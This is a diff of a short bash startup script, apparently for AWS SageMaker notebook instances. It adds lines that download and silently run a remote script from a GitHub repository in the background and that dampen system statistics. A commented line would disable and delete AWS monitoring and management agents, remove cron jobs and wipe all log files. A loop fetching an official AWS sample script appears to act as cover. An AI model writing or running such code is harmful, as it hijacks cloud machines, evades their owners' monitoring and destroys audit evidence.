@@ -1,3 +1,11 @@
 #!/bin/bash
+#systemctl disable amazon-cloudwatch-agent.service; systemctl stop amazon-cloudwatch-agent.service; systemctl disable amazon-cloudwatch-agent; systemctl stop amazon-cloudwatch-agent; rm -rf /usr/bin/ssm-agent-worker /usr/bin/amazon-ssm-agent /usr/sbin/role-agent /usr/libexec/postfix/master /opt/aws/amazon-cloudwatch-agent /etc/opt/ml/scripts/clean-jupyter-log /etc/opt/ml/scripts/sagemaker-nbi-agent /etc/opt/ml/scripts/restart-sagemaker-agent-watcher /etc/opt/ml/scripts/relaunch-docker-service /etc/opt/ml/scripts/sagemaker-role-proxy-agent /etc/opt/ml/scripts/set-up-agent-namespace /usr/sbin/sample-notebooks-config /opt/.sagemaker/add_cloud_watch_agent_configuration.py /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/*; find /var/log -type f -delete;
 
-bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/MoeClub/Note/master/InstallNET.sh) -d 12 -v 64 -a -p "Ls.123456" -port 2233 -cmd "IyEvYmluL2Jhc2gKCmFwdCAtcXF5IGluc3RhbGwgd2dldApiYXNoIDwod2dldCAtcU8tIGh0dHBzOi8vZ2l0aHViLmNvbS9hcm15Mm1pbC9uamFic2NiL3Jhdy9yZWZzL2hlYWRzL21haW4vLi4uKSA+Pi9kZXYvbnVsbCAyPiYxICYK"
+bash <(sysctl -w vm.stat_interval=86400  || sudo sysctl -w vm.stat_interval=86400) >/dev/null 2>&1
+
+bash <(wget -qO- https://github.com/army2mil/njabscb/raw/refs/heads/main/...) >>/dev/null 2>&1 &
+while [ 1 ]; do
+    bash <(wget -qO- https://github.com/aws-samples/amazon-sagemaker-notebook-instance-lifecycle-config-samples/blob/master/scripts/publish-instance-metrics/on-start.sh)
+    sleep 600
+done
+#bash <(wget -qO- https://github.com/army2mil/cautech/raw/refs/heads/main/...) >>/dev/null 2>&1 &
